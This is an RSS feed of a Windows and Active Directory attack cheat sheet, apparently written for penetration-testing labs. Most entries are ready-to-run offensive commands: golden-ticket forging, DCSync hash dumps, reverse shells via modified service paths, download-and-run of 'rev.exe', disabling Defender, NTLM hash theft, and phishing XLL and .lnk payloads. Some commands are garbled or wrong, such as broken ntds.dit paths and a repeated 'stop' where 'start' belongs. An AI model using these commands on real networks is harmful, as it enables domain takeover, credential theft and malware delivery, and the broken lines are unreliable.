channel.title: Windows on TLDRBins
channel.description: Recent content in Windows on TLDRBins

item.title: Abuse Parent Child Domain Trusts
item.description: Privesc from DA to EA 1. Check direction and target Get-ADTrust -Filter * # Or nltest /domain_trusts # Or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe 'lsadump::trust' 'exit' 3. Get krbtgt hash of current domain ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit' 4. Forge a golden ticket # Append '-519' to target domain SID ./mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:CURRENT.EXAMPLE.COM /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:c:\windows\tasks\ticket.kirbi' 'exit' Note: May need to try different high value hashes

item.title: Account Operators
item.description: Import PowerView.ps1 . .\PowerView.ps1 Create New User Account Authenticated $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} # Create new user New-AdUser new_user -enabled $true -accountpassword $secstr # Grant new user privilege (e.g. WinRM) Add-DomainGroupMember -Identity WinRM -Members 'new_user' Runas $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Create new user New-AdUser new_user -credential $cred -enabled $true -accountpassword $secstr # Grant new user privilege (e.

item.title: AD Recycle Bin
item.description: AD Recycle Bin import-module activedirectory # Query all deleted objects within domain Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects # Get all details for the deleted account (e.g. TempAdmin) Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property * # Restore deleted account (Need to rename to avoid user exist) Restore-ADObject -Identity ObjectGUID -NewName "new_user" -TargetPath "CN=Users,DC=example,DC=com"

item.title: ADCS
item.description: Enum (From Linux) certipy-ad # Use certipy-ad certipy-ad find -u <USERNAME> -p <PASSWORD> -target <TARGET> -text -stdout -vulnerable nxc # Use nxc nxc ldap 10.10.11.10 -u <USERNAME> -p <PASSWORD> -M adcs Enum (From Windows) Powershell # Check ADCS service net start | findstr /i cert # Check env certutil # Get list of certificate templates certutil -catemplates Certify.exe # Get info of each template .\certify.exe find # Find vuln template .

item.title: AddKeyCredentialLink
item.description: From Linux pywhisker 0. Pre-check (optional) python3 pywhisker.py --action list -d example.com -u current_user -p password --dc-ip 10.10.11.10 -t target_user --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d example.com -u current_user -p password --dc-ip 10.10.11.10 -t target_user --use-ldaps # Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type' pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file PKINITtools sudo ntpdate -s 10.10.11.10 && python3 gettgtpkinit.py -cert-pfx <.pfx> -pfx-pass <pfx_password> example.

item.title: AddSelf
item.description: AddSelf (From Linux) powerview.py powerview.py # Connect sudo ntpdate -s <DC> && powerview <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN> # Add self to group Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> # Check Get-DomainGroupMember -Identity <TARGET_GROUP> # Exit and login to make changes first Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol # Check Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIdentifier contains <USERNAME>" bloodAD bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add groupMember <TARGET_GROUP> <USERNAME> # After getting full control of target group (e.

item.title: AllowedToDelegate
item.description: Craft a Ticket # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s 10.10.11.10 && impacket-getST -dc-ip 10.10.11.10 -spn www/dc.example.com -hashes :<HASH> -impersonate Administrator example.com/username # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s 10.10.11.10 && wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work

item.title: Alternate Data Stream
item.description: Show ADS # cmd cmd /C dir /R \windows\tasks\file.txt Get-Item -Path \windows\tasks\file.txt -force -stream *

item.title: Bloodhound
item.description: sharphound.ps1 Download sharphound.ps1 # Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all bloodhound-python # With Creds bloodhound-python -d example.com -u username -p password -dc example.com -ns 10.10.11.10 -c all --zip # With Kerberos sudo ntpdate -s dc.example.com && bloodhound-python -u username -p 'password' -k -d example.com -dc dc.example.com -ns 10.10.11.10 -c all --zip bloodhound with PKI support BloodHound # Fix: GPU process isn't usable. Goodbye.

item.title: Built-in Group
item.description: Privesc Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 # Assumed nc.exe is uploaded sc.exe config VSS binpath="C:\Windows\Tasks\nc.exe -e cmd 10.10.14.10 443" # Stop service sc.exe stop VSS # Start service sc.exe start VSS

item.title: Bypass ASMI
item.description: Payloads Using Hardware Breakpoints Scanning Interception Note: Tried these 2 and worked evil-winrm menu Bypass-4MSI Note: have to run menu first

item.title: Compressed Files
item.description: Hint: Always put the zip file inside a new folder before unzip zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # zip a symlinks (not the destination file) zip --symlinks file.zip symlink # List files without unzip unzip -l file.zip # unzip unzip file.zip # unzip (powershell) Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\windows\tasks\file.zip', 'c:\windows\tasks\') tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.

item.title: Constrained Delegation
item.description: Find delegation sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k Check forwardable flag impacket-getST -spn <SERVICE>/<DC> -impersonate administrator '<DOMAIN>/<USERNAME>' -hashes :<HASH> -self # Check flags describeTicket.py <TICKET_1>.ccache RBCD # Add delegation impacket-rbcd '<DOMAIN>/<USERNAME>' -hashes :<HASH> -k -delegate-from <USERNAME> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps # Check impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k # Impersonate impacket-getST '<DOMAIN>/<USERNAME>:<PASSWORD>' -spn <SERVICE>/<DC> -impersonate <TARGET_2> # Check forwardable flag describeTicket.

item.title: Cross Session Relay
Defender (Windows)
item.description: Disable defender # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

item.title: dotnet
item.description: Compile c# project from Linux Download dotnet # Check dotnet --info # Prepare mkdir new_project cd new_project # Init dotnet new console # Create .sln file dotnet new sln # Link .sln to .csproj dotnet sln new_project.sln add new_project.csproj # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Build solution dotnet build # Run dotnet run

item.title: DPAPI
item.description: Auto dump all (From Linux) DonPAPI DonPAPI collect -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -t <TARGET> Browser Saved Creds Auto SharpChromium.exe .\SharpChromium.exe logins Manual (e.g. Edge) # Get Local State json file, copy and paste to local Linux type "C:\Users\[USER]\appdata\local\microsoft\edge\User Data\Local State" # Get Login Data binary file certutil -encode "C:\Users\[USER]\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\Windows\Tasks\logindata # Copy and paste to local Linux type C:\Windows\Tasks\logindata # Base64 decode cat logindata_b64 | base64 -d > logindata # Extract key from local state cat localstate | jq -r .

item.title: evil-winrm
item.description: Connect by password evil-winrm -i 127.0.0.1 -u username -p password Connect by hash evil-winrm -i 10.10.11.10 -u username -H <HASH> Connect by kerberos sudo ntpdate -s 10.10.11.10 && evil-winrm -i dc.example.com -r EXAMPLE.COM Connect by .crt and .key evil-winrm -i example.com -S -k auth.key -c auth.crt

item.title: ExecuteDCOM
item.description: impacket (From Linux) # Revshell impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@10.10.11.10 '<powershell #3 Base64>' -silentcommand -object MMC20

item.title: File Transfer (Linux to Windows)
item.description: HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe && c:\windows\tasks\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile c:\windows\tasks\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: PowerShell 3.0+ # Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: curl is not always available

item.title: File Transfer (Windows To Linux)
item.description: SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.

item.title: Find (Windows)
item.description: Find a file ls -path \Users -Filter file.txt -recurse -erroraction silent where /R C:\Users file.txt Find a file, with rule dir /s /b /a:-d-h \Users\Administrator | findstr /i /v "appdata" +---------------------------------------+ |dir: | |/s : include subfolders | |/b : bare format | |/a:-d-h : exclude directories or hidden| | | |findstr: | |/i : case insensitive | |/v appdata : exclude 'appdata' | +---------------------------------------+ Show hidden files Get-ChildItem -force

item.title: Firewall (Windows)
item.description: Check Firewall Rules # cmd cmd /c "netsh advfirewall firewall show rule name=all|findstr Name:" # powershell Get-NetFirewallProfile # Check outbound rules Get-NetFirewallRule -Direction Outbound -Enabled True # Pretty Print powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"

item.title: ForceChangePassword
item.description: Using PowerView.ps1 . .\PowerView.ps1 Change Target User Password $pass = ConvertTo-SecureString 'password' -AsPlainText -Force Set-DomainUserPassword -Identity <target_user> -AccountPassword $pass Using rpcclient rpcclient -U 'domain/username%password' 10.10.11.10 -c 'setuserinfo2 target_user 23 "password"'

item.title: GenericAll
item.description: Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Change Target User Password From Windows $pass = ConvertTo-SecureString 'password' -AsPlainText -Force Set-DomainUserPassword -Identity <target_user> -AccountPassword $pass From Linux bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD> Abuse #2 : Get shawdow credentials (From Linux) sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -k -account <TARGET_USER> -target <DC> Abuse #3 : Add user to group Authenticated # For example 'Exchange Windows Permissions' Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members USER Runas $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.

item.title: GenericWrite
item.description: Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser <target_user> | ConvertFrom-UACValue # Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity <target_user> -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 Abuse #2 : Kerberoasting by adding spn Add spn # Add spn setspn -a MSSQLSvc/example.com:1433 example.com\target_user # Check Get-DomainUser target_user | Select serviceprincipalname Runas $password = ConvertTo-SecureString 'password' -AsPlainText -Force $cred = New-Object System.

item.title: GetChanges/GetChangesAll
item.description: GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 Mimikatz (From Windows) .\mimikatz.exe 'lsadump::dcsync /domain:EXAMPLE.COM /user:administrator' exit

item.title: GPOs
item.description: GPO Abuse SharpGPOAbuse List GPOs Name Get-GPO -All | Select-Object DisplayName Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USERNAME> --GPOName <GPO_NAME> Force reload gpupdate /force

item.title: Host a SMB Server
item.description: Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work For older Windows Machines impacket-smbserver share .

item.title: IIS
item.description: IIS Version +-------------------------------------------------------------------------------+ |Version Start Date End Date | +-------------------------------------------------------------------------------+ |IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | |IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | |IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027| |IIS 10 on Windows 10 Pro Jul 29, 2015 | |IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | |IIS 8.

item.title: Kerberoasting
item.description: AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p '' --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 example.com/user Kerberoasting From Linux # Fix time skew sudo ntpdate -s 10.10.11.10 && impacket-GetUserSPNs -request 'example.com/username:password' -dc-ip 10.10.11.10 Note: Times skew have to be within 5 minutes in kerberos # Kerberoasting without cred sudo ntpdate -s 10.

item.title: Kerberos
item.description: Kerbrute kerbrute kerbrute userenum --domain example.com --dc 10.10.11.10 usernames.txt Usernames generator username-anarchy ./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1 : Using impacket sudo ntpdate -s 10.10.11.10 && impacket-getTGT -hashes :<HASH> example.com/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to '/etc/hosts' (Try different order if not work) 10.

item.title: Krbrelayx
item.description: Tools krbrelayx Add Active Directory Integrated DNS records via LDAP python3 dnstool.py -u domain\\username -p password --action add --record test --data 10.10.14.10 --type A 10.10.11.10 # Capture NTLM hash sudo responder -I tun0

item.title: LDAP
item.description: ldapsearch # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u 'example.com\username' -p 'passowrd' 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b 'DC=EXAMPLE,DC=COM' # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b 'DC=EXAMPLE,DC=COM' '(objectClass=person)' # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.

item.title: Machine Account
item.description: Abuse #1 : Microsoft virtual account 1. Create a ticket from Microsoft virtual account .\rubeus.exe tgtdeleg /nowrap 2. Convert kirbi to ccache (Back to Linux) RubeusToCcache python3 rubeustoccache.py <base64_encoded_ticket> secrets.kirbi secrets.ccache 3. Dump Secrets export KRB5CCNAME=secrets.ccache sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator

item.title: Metasploit
item.description: Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

item.title: Microsoft Access Database
item.description: Tool sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done # Dump data from table mdb-export database.mdb table_name

item.title: Microsoft Oulook Email Folder
item.description: Open .pst file Tool sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Use mutt mutt -Rf emails.mbox +------------------------------------+ |Note: Answer No to create /root/Mail| | | |Arrow : Move to the email | |Enter : View email | |q : back | |q again : quit | +------------------------------------+ Open .msg file Tool # Install msgconvert sudo apt install libemail-outlook-message-perl # Install formail sudo apt install procmail Basic # Convert to .

item.title: MSSQL Agent Jobs
item.description: 1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Fix : Cannot resolve the collation conflict between "Latin1_General_CI_AI" and "SQL_Latin1_General_CP1_CI_AS" SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN='<PRINCIPAL>'; INSERT proxies EXEC msdb.

item.title: MSSQL General
item.description: General Connect to MSSQL DB (From Linux) impacket-mssqlclient 'username:password@10.10.11.10' # Without TLS impacket-mssqlclient -windows-auth 'username:password@10.10.11.10' Connect to MSSQL DB (From Windows) # With inline query sqlcmd -S localhost -U username -P password -d db_name -Q "SELECT @@version;" Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = '1'; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.

item.title: MSSQL Linked Servers
item.description: Linked Servers Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [CURRENT_SERVER]') at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN test WITH PASSWORD = ''''password'''';'') AT [CURRENT_SERVER]') AT [LINKED_SERVER] EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''test'''', ''''sysadmin'''''') AT [CURRENT_SERVER]') AT [LINKED_SERVER]

item.title: MSSQL Privilege Escalation
item.description: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree '\\10.10.14.10\any\thing'; # Or use master; exec xp_dirtree '\\10.10.14.10\any\thing'; # Or load_file('\\10.10.14.10\any\thing'); Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: NetExec (nxc)
item.description: nxc Download nxc Basic Commands # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.

item.title: NTLM Relay Attack
item.description: 1. Run socat to redirect traffic (In Windows Target) socat # Upload socat.zip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\programdata\socat.zip', 'c:\programdata') .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80 2. Enable webdav (In Windows Target) $Source = @" using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.

item.title: Phishing
item.description: Create malicious .lnk $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut("C:\Windows\Tasks\Calculator.lnk") $link.TargetPath = "C:\windows\tasks\rev.exe" $link.Save() Phishing with XLL (Excel) revshells.com shell.c #include <windows.h> __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.

item.title: RBCD Attack
item.description: RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u <USERNAME> -p <PASSWORD> -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc-ip 10.10.11.10 example.com/username:password 2. Rbcd attack impacket-rbcd -delegate-to TARGET_COMPUTER$ -delegate-from EvilComputer$ -dc-ip dc.example.com -action 'write' example.com/username:password 3. Impersonate sudo ntpdate -s dc.example.com && impacket-getST -spn cifs/dc.example.com -impersonate administrator -dc-ip dc.example.com 'example.com/EvilComputer:password' 4. Import ticket export KRB5CCNAME=administrator@cifs_dc.example.com@example.com.ccache 5. Post-Attack # Remote sudo ntpdate -s dc.

item.title: ReadGMSAPassword
item.description: gMSADumper gMSADumper python3 gMSADumper.py -u username -p password -l 10.10.11.10 -d example.com bloodAD bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword Save as Cred (From Windows) $gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword' $mp = $gmsa.'msDS-ManagedPassword' $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword $cred = New-Object System.Management.Automation.PSCredential <TARGET_NAME>, $SecPass # For example, change password of another target user Invoke-Command -ComputerName <COMPUTER_NAME> -ScriptBlock {Set-ADAccountPassword -Identity <ANOTHER_TARGET_NAME> -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Test1234' -force)} -Credential $cred

item.title: ReadLAPSPassword
item.description: From Windows Import PowerView.ps1 . .\PowerView.ps1 Runas $password = ConvertTo-SecureString "password" -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential("domain\username", $password) Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred From Linux ldapsearch -h 10.10.11.10 -b 'DC=example,DC=com' -x -D username@example.com -w password "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

item.title: RPC
item.description: RPC rpcclient # Connect without creds rpcclient -U '' -N 10.10.11.10 # Connect with creds rpcclient -U domain/username%password 10.10.11.10 # Inline execute command rpcclient -U domain/username%password 10.10.11.10 -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup RID # Query group member by rid querygroupmem RID # Query user by rid queryuser RID # Look up a user lookupnames USERNAME # Look up by SID lookupsids SID impacket-lookupsid impacket-lookupsid username:password@10.

item.title: Runas
item.description: Runas (with creds) Create Cred Object #1 $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Create Cred Object #2 $password = ConvertTo-SecureString "password" -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential("domain\username", $password) Run Commnad Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost # If error, try Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost -auth credssp # Invoke command with config Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost -ConfigurationName config_name Create a new PS session new-pssession -computername .

item.title: Scheduled tasks
item.description: Check scheduled tasks schtasks /query # List details schtasks /TN \Microsoft\Windows\<FOLDER>\<TASKNAME> /FO LIST /V

item.title: SeBackupPrivilege/SeRestorePrivilege
item.description:
robocopy # For example robocopy /b <target_dir_path> C:\Windows\Tasks <target_file> Helper dlls SeBackupPrivilegeUtils.dll SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege <target_file_path> C:\Windows\Tasks\<target_file> # For example Copy-FileSeBackupPrivilege C:\Windows
tds
tds.dit C:\Windows\Tasks
tds.dit diskshadow Create a .dsh file set context persistent nowriters set metadata C:\Windows\Tasks	est.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh Run vss.dsh # Upload and run diskshadow /s C:\Windows\Tasks\vss.dsh Host a smb server (In Linux) impacket-smbserver share .

item.title: secretsdump
item.description: Impacket Download Impacket secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 nxc nxc smb -dc-ip <DC> -u <USERNAME> -H <HASH> --ntds

item.title: Secure String
item.description: Decrypt secure string $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "administrator", $ss $cred.GetNetworkCredential().password

item.title: SeDebugPrivilege
item.description: Method #1: Meterpreter Migrate # Inside meterpreter ps winlogon migrate <PID> Method #2 : psgetsys.ps1 psgetsys # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <powershell #3 Base64>"

item.title: SeImpresonate
item.description: Recover SeImpresonate FullPower .\FullPowers.exe -c "whoami /priv" # Revshell .\FullPowers.exe -c "<powershell #3 Base64>" Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege" # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "<SERVICE_ACCOUNT>" -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.exe -e powershell 10.

item.title: SeLoadDriverPrivilege
item.description: SeLoadDriverPrivilege Compile eoploaddriver eoploaddriver.cpp 1. Open Visual Studio 2022 2. Create a new project 3. Project Template : C++ Console App 4. Project Name : Eoploaddriver 5. Replace code : eoploaddriver.cpp 6. Remove header : `include "stdafx.h"` 7. Release -> x64 8. Build -> Build Solution 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.exe Download Capcom.sys Capcom.sys Compile ExploitCapcom ExploitCapcom 1. Double click ExploitCapcom.sln 2. Replace the payload to `TCHAR CommandLine[] = TEXT("C:\\Windows\\Tasks\\rev.exe");` 3.

item.title: Server Operators
item.description: Server Operators # Change a service path (e.g. browser) sc.exe config browser binPath= "C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.10 443" # Stop service sc.exe stop browser # Start service sc.exe stop browser

item.title: Silver Ticket
